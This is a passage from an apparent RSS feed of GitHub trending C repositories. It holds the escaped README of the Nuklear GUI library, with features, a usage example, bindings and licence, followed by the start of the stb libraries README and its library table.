written in ANSI C and licensed under public domain. It was designed as a simple
embeddable user interface for application and does not have any dependencies,
a default render backend or OS window/input handling but instead provides a
highly modular, library-based approach, with simple input state for input and
draw commands describing primitive shapes as output. So instead of providing a
layered library that tries to abstract over a number of platform and
render backends, it focuses only on the actual UI.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-features" class="anchor" aria-hidden="true" href="#features"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Features&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Immediate-mode graphical user interface toolkit&lt;/li&gt;
&lt;li&gt;Single-header library&lt;/li&gt;
&lt;li&gt;Written in C89 (ANSI C)&lt;/li&gt;
&lt;li&gt;Small codebase (~18kLOC)&lt;/li&gt;
&lt;li&gt;Focus on portability, efficiency and simplicity&lt;/li&gt;
&lt;li&gt;No dependencies (not even the standard library if not wanted)&lt;/li&gt;
&lt;li&gt;Fully skinnable and customizable&lt;/li&gt;
&lt;li&gt;Low memory footprint with total control of memory usage if needed / wanted&lt;/li&gt;
&lt;li&gt;UTF-8 support&lt;/li&gt;
&lt;li&gt;No global or hidden state&lt;/li&gt;
&lt;li&gt;Customizable library modules (you can compile and use only what you need)&lt;/li&gt;
&lt;li&gt;Optional font baker and vertex buffer output&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cdn.statically.io/gh/Immediate-Mode-UI/nuklear/master/doc/nuklear.html" rel="nofollow"&gt;Documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-building" class="anchor" aria-hidden="true" href="#building"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building&lt;/h2&gt;
&lt;p&gt;This library is self-contained in one single header file and can be used either
in header-only mode or in implementation mode. The header-only mode is used
by default when included and allows including this header in other headers
and does not contain the actual implementation.&lt;/p&gt;
&lt;p&gt;The implementation mode requires defining the preprocessor macro
&lt;code&gt;NK_IMPLEMENTATION&lt;/code&gt; in &lt;em&gt;one&lt;/em&gt; .c/.cpp file before &lt;code&gt;#include&lt;/code&gt;ing this file, e.g.:&lt;/p&gt;
&lt;div class="highlight highlight-source-c"&gt;&lt;pre&gt;#&lt;span class="pl-k"&gt;define&lt;/span&gt; &lt;span class="pl-en"&gt;NK_IMPLEMENTATION&lt;/span&gt;
#&lt;span class="pl-k"&gt;include&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;nuklear.h&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;IMPORTANT: Every time you include "nuklear.h" you have to define the same optional flags.
This is very important; not doing it either leads to compiler errors, or even worse, stack corruptions.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-gallery" class="anchor" aria-hidden="true" href="#gallery"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Gallery&lt;/h2&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://cloud.githubusercontent.com/assets/8057201/11761525/ae06f0ca-a0c6-11e5-819d-5610b25f6ef4.gif"&gt;&lt;img src="https://cloud.githubusercontent.com/assets/8057201/11761525/ae06f0ca-a0c6-11e5-819d-5610b25f6ef4.gif" alt="screenshot" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://cloud.githubusercontent.com/assets/8057201/13538240/acd96876-e249-11e5-9547-5ac0b19667a0.png"&gt;&lt;img src="https://cloud.githubusercontent.com/assets/8057201/13538240/acd96876-e249-11e5-9547-5ac0b19667a0.png" alt="screen" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://cloud.githubusercontent.com/assets/8057201/13538243/b04acd4c-e249-11e5-8fd2-ad7744a5b446.png"&gt;&lt;img src="https://cloud.githubusercontent.com/assets/8057201/13538243/b04acd4c-e249-11e5-8fd2-ad7744a5b446.png" alt="screen2" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://cloud.githubusercontent.com/assets/8057201/9976995/e81ac04a-5ef7-11e5-872b-acd54fbeee03.gif"&gt;&lt;img src="https://cloud.githubusercontent.com/assets/8057201/9976995/e81ac04a-5ef7-11e5-872b-acd54fbeee03.gif" alt="node" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://cloud.githubusercontent.com/assets/8057201/15991632/76494854-30b8-11e6-9555-a69840d0d50b.png"&gt;&lt;img src="https://cloud.githubusercontent.com/assets/8057201/15991632/76494854-30b8-11e6-9555-a69840d0d50b.png" alt="skinning" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://cloud.githubusercontent.com/assets/8057201/14902576/339926a8-0d9c-11e6-9fee-a8b73af04473.png"&gt;&lt;img src="https://cloud.githubusercontent.com/assets/8057201/14902576/339926a8-0d9c-11e6-9fee-a8b73af04473.png" alt="gamepad" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-example" class="anchor" aria-hidden="true" href="#example"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Example&lt;/h2&gt;
&lt;div class="highlight highlight-source-c"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; init gui state &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
&lt;span class="pl-k"&gt;struct&lt;/span&gt; nk_context ctx;
&lt;span class="pl-en"&gt;nk_init_fixed&lt;/span&gt;(&amp;amp;ctx, calloc(&lt;span class="pl-c1"&gt;1&lt;/span&gt;, MAX_MEMORY), MAX_MEMORY, &amp;amp;font);

&lt;span class="pl-k"&gt;enum&lt;/span&gt; {EASY, HARD};
&lt;span class="pl-k"&gt;static&lt;/span&gt; &lt;span class="pl-k"&gt;int&lt;/span&gt; op = EASY;
&lt;span class="pl-k"&gt;static&lt;/span&gt; &lt;span class="pl-k"&gt;float&lt;/span&gt; value = &lt;span class="pl-c1"&gt;0&lt;/span&gt;.&lt;span class="pl-c1"&gt;6f&lt;/span&gt;;
&lt;span class="pl-k"&gt;static&lt;/span&gt; &lt;span class="pl-k"&gt;int&lt;/span&gt; i =  &lt;span class="pl-c1"&gt;20&lt;/span&gt;;

&lt;span class="pl-k"&gt;if&lt;/span&gt; (nk_begin(&amp;amp;ctx, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Show&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, nk_rect(&lt;span class="pl-c1"&gt;50&lt;/span&gt;, &lt;span class="pl-c1"&gt;50&lt;/span&gt;, &lt;span class="pl-c1"&gt;220&lt;/span&gt;, &lt;span class="pl-c1"&gt;220&lt;/span&gt;),
    NK_WINDOW_BORDER|NK_WINDOW_MOVABLE|NK_WINDOW_CLOSABLE)) {
    &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; fixed widget pixel width &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
    &lt;span class="pl-c1"&gt;nk_layout_row_static&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-c1"&gt;30&lt;/span&gt;, &lt;span class="pl-c1"&gt;80&lt;/span&gt;, &lt;span class="pl-c1"&gt;1&lt;/span&gt;);
    &lt;span class="pl-k"&gt;if&lt;/span&gt; (&lt;span class="pl-c1"&gt;nk_button_label&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;button&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;)) {
        &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; event handling &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
    }

    &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; fixed widget window ratio width &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
    &lt;span class="pl-c1"&gt;nk_layout_row_dynamic&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-c1"&gt;30&lt;/span&gt;, &lt;span class="pl-c1"&gt;2&lt;/span&gt;);
    &lt;span class="pl-k"&gt;if&lt;/span&gt; (&lt;span class="pl-c1"&gt;nk_option_label&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;easy&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, op == EASY)) op = EASY;
    &lt;span class="pl-k"&gt;if&lt;/span&gt; (&lt;span class="pl-c1"&gt;nk_option_label&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;hard&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, op == HARD)) op = HARD;

    &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;/*&lt;/span&gt; custom widget pixel width &lt;span class="pl-c"&gt;*/&lt;/span&gt;&lt;/span&gt;
    &lt;span class="pl-c1"&gt;nk_layout_row_begin&lt;/span&gt;(&amp;amp;ctx, NK_STATIC, &lt;span class="pl-c1"&gt;30&lt;/span&gt;, &lt;span class="pl-c1"&gt;2&lt;/span&gt;);
    {
        &lt;span class="pl-c1"&gt;nk_layout_row_push&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-c1"&gt;50&lt;/span&gt;);
        &lt;span class="pl-c1"&gt;nk_label&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Volume:&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, NK_TEXT_LEFT);
        &lt;span class="pl-c1"&gt;nk_layout_row_push&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-c1"&gt;110&lt;/span&gt;);
        &lt;span class="pl-c1"&gt;nk_slider_float&lt;/span&gt;(&amp;amp;ctx, &lt;span class="pl-c1"&gt;0&lt;/span&gt;, &amp;amp;value, &lt;span class="pl-c1"&gt;1&lt;/span&gt;.&lt;span class="pl-c1"&gt;0f&lt;/span&gt;, &lt;span class="pl-c1"&gt;0&lt;/span&gt;.&lt;span class="pl-c1"&gt;1f&lt;/span&gt;);
    }
    &lt;span class="pl-c1"&gt;nk_layout_row_end&lt;/span&gt;(&amp;amp;ctx);
}
&lt;span class="pl-en"&gt;nk_end&lt;/span&gt;(&amp;amp;ctx);&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://cloud.githubusercontent.com/assets/8057201/10187981/584ecd68-675c-11e5-897c-822ef534a876.png"&gt;&lt;img src="https://cloud.githubusercontent.com/assets/8057201/10187981/584ecd68-675c-11e5-897c-822ef534a876.png" alt="example" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-bindings" class="anchor" aria-hidden="true" href="#bindings"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Bindings&lt;/h2&gt;
&lt;p&gt;There are a number of nuklear bindings for different languges created by other authors.
I cannot attest for their quality since I am not necessarily proficient in any of these
languages. Furthermore there are no guarantee that all bindings will always be kept up to date:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/glegris/nuklear4j"&gt;Java&lt;/a&gt; by Guillaume Legris&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Timu5/bindbc-nuklear"&gt;D&lt;/a&gt; by Mateusz Muszyński&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/golang-ui/nuklear"&gt;Golang&lt;/a&gt; by &lt;a href="mailto:golang-ui@github.com"&gt;golang-ui@github.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/snuk182/nuklear-rust"&gt;Rust&lt;/a&gt; by &lt;a href="mailto:snuk182@github.com"&gt;snuk182@github.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wasamasa/nuklear"&gt;Chicken&lt;/a&gt; by &lt;a href="mailto:wasamasa@github.com"&gt;wasamasa@github.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/zacharycarter/nuklear-nim"&gt;Nim&lt;/a&gt; by &lt;a href="mailto:zacharycarter@github.com"&gt;zacharycarter@github.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Lua
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/keharriso/love-nuklear"&gt;LÖVE-Nuklear&lt;/a&gt; by Kevin Harrison&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/stetre/moonnuklear"&gt;MoonNuklear&lt;/a&gt; by Stefano Trettel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/billsix/pyNuklear"&gt;pyNuklear&lt;/a&gt; by William Emerison Six (ctypes-based wrapper)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/nathanrw/nuklear-cffi"&gt;pynk&lt;/a&gt; by &lt;a href="mailto:nathanrw@github.com"&gt;nathanrw@github.com&lt;/a&gt; (cffi binding)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cartman300/NuklearDotNet"&gt;CSharp/.NET&lt;/a&gt; by &lt;a href="mailto:cartman300@github.com"&gt;cartman300@github.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-credits" class="anchor" aria-hidden="true" href="#credits"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Credits&lt;/h2&gt;
&lt;p&gt;Developed by Micha Mettke and every direct or indirect contributor to the GitHub.&lt;/p&gt;
&lt;p&gt;Embeds &lt;code&gt;stb_texedit&lt;/code&gt;, &lt;code&gt;stb_truetype&lt;/code&gt; and &lt;code&gt;stb_rectpack&lt;/code&gt; by Sean Barrett (public domain)
Embeds &lt;code&gt;ProggyClean.ttf&lt;/code&gt; font by Tristan Grimmer (MIT license).&lt;/p&gt;
&lt;p&gt;Big thank you to Omar Cornut (ocornut@github) for his &lt;a href="https://github.com/ocornut/imgui"&gt;imgui&lt;/a&gt; library and
giving me the inspiration for this library, Casey Muratori for handmade hero
and his original immediate-mode graphical user interface idea and Sean
Barrett for his amazing single-header &lt;a href="https://github.com/nothings/stb"&gt;libraries&lt;/a&gt; which restored my faith
in libraries and brought me to create some of my own. Finally Apoorva Joshi for his single-header &lt;a href="http://apoorvaj.io/single-header-packer.html" rel="nofollow"&gt;file packer&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;------------------------------------------------------------------------------
This software is available under 2 licenses -- choose whichever you prefer.
------------------------------------------------------------------------------
ALTERNATIVE A - MIT License
Copyright (c) 2017 Micha Mettke
Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
------------------------------------------------------------------------------
ALTERNATIVE B - Public Domain (www.unlicense.org)
This is free and unencumbered software released into the public domain.
Anyone is free to copy, modify, publish, use, compile, sell, or distribute this
software, either in source code form or as a compiled binary, for any purpose,
commercial or non-commercial, and by any means.
In jurisdictions that recognize copyright laws, the author or authors of this
software dedicate any and all copyright interest in the software to the public
domain. We make this dedication for the benefit of the public at large and to
the detriment of our heirs and successors. We intend this dedication to be an
overt act of relinquishment in perpetuity of all present and future rights to
this software under copyright law.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-----------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>Immediate-Mode-UI</author><guid isPermaLink="false">https://github.com/Immediate-Mode-UI/Nuklear</guid><pubDate>Tue, 04 Feb 2020 00:06:00 GMT</pubDate></item><item><title>nothings/stb #7 in C, This week</title><link>https://github.com/nothings/stb</link><description>&lt;p&gt;&lt;i&gt;stb single-file public domain libraries for C/C++&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;
&lt;h1&gt;&lt;a id="user-content-stb" class="anchor" aria-hidden="true" href="#stb"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;stb&lt;/h1&gt;
&lt;p&gt;single-file public domain (or MIT licensed) libraries for C/C++&lt;/p&gt;
&lt;p&gt;Noteworthy:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;image loader: &lt;a href="stb_image.h"&gt;stb_image.h&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;image writer: &lt;a href="stb_image_write.h"&gt;stb_image_write.h&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;image resizer: &lt;a href="stb_image_resize.h"&gt;stb_image_resize.h&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;font text rasterizer: &lt;a href="stb_truetype.h"&gt;stb_truetype.h&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;typesafe containers: &lt;a href="stb_ds.h"&gt;stb_ds.h&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most libraries by stb, except: stb_dxt by Fabian "ryg" Giesen, stb_image_resize
by Jorge L. "VinoBS" Rodriguez, and stb_sprintf by Jeff Roberts.&lt;/p&gt;
&lt;p&gt;&lt;a name="user-content-stb_libs"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;library&lt;/th&gt;
&lt;th&gt;lastest version&lt;/th&gt;
&lt;th&gt;category&lt;/th&gt;
&lt;th&gt;LoC&lt;/th&gt;
&lt;th&gt;description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_vorbis.c"&gt;stb_vorbis.c&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.18&lt;/td&gt;
&lt;td&gt;audio&lt;/td&gt;
&lt;td&gt;5554&lt;/td&gt;
&lt;td&gt;decode ogg vorbis files from file/memory to float/16-bit signed output&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_image.h"&gt;stb_image.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;2.25&lt;/td&gt;
&lt;td&gt;graphics&lt;/td&gt;
&lt;td&gt;7656&lt;/td&gt;
&lt;td&gt;image loading/decoding from file/memory: JPG, PNG, TGA, BMP, PSD, GIF, HDR, PIC&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_truetype.h"&gt;stb_truetype.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.23&lt;/td&gt;
&lt;td&gt;graphics&lt;/td&gt;
&lt;td&gt;5001&lt;/td&gt;
&lt;td&gt;parse, decode, and rasterize characters from truetype fonts&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_image_write.h"&gt;stb_image_write.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.14&lt;/td&gt;
&lt;td&gt;graphics&lt;/td&gt;
&lt;td&gt;1666&lt;/td&gt;
&lt;td&gt;image writing to disk: PNG, TGA, BMP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_image_resize.h"&gt;stb_image_resize.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.96&lt;/td&gt;
&lt;td&gt;graphics&lt;/td&gt;
&lt;td&gt;2631&lt;/td&gt;
&lt;td&gt;resize images larger/smaller with good quality&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_rect_pack.h"&gt;stb_rect_pack.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.00&lt;/td&gt;
&lt;td&gt;graphics&lt;/td&gt;
&lt;td&gt;628&lt;/td&gt;
&lt;td&gt;simple 2D rectangle packer with decent quality&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_ds.h"&gt;stb_ds.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.63&lt;/td&gt;
&lt;td&gt;utility&lt;/td&gt;
&lt;td&gt;1828&lt;/td&gt;
&lt;td&gt;typesafe dynamic array and hash tables for C, will compile in C++&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_sprintf.h"&gt;stb_sprintf.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.07&lt;/td&gt;
&lt;td&gt;utility&lt;/td&gt;
&lt;td&gt;1877&lt;/td&gt;
&lt;td&gt;fast sprintf, snprintf for C/C++&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stretchy_buffer.h"&gt;stretchy_buffer.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.04&lt;/td&gt;
&lt;td&gt;utility&lt;/td&gt;
&lt;td&gt;263&lt;/td&gt;
&lt;td&gt;typesafe dynamic array for C (i.e. approximation to vector&amp;lt;&amp;gt;), doesn't compile as C++&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_textedit.h"&gt;stb_textedit.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.13&lt;/td&gt;
&lt;td&gt;user interface&lt;/td&gt;
&lt;td&gt;1404&lt;/td&gt;
&lt;td&gt;guts of a text editor for games etc implementing them from scratch&lt;/td&gt;
&lt;/tr&gt;
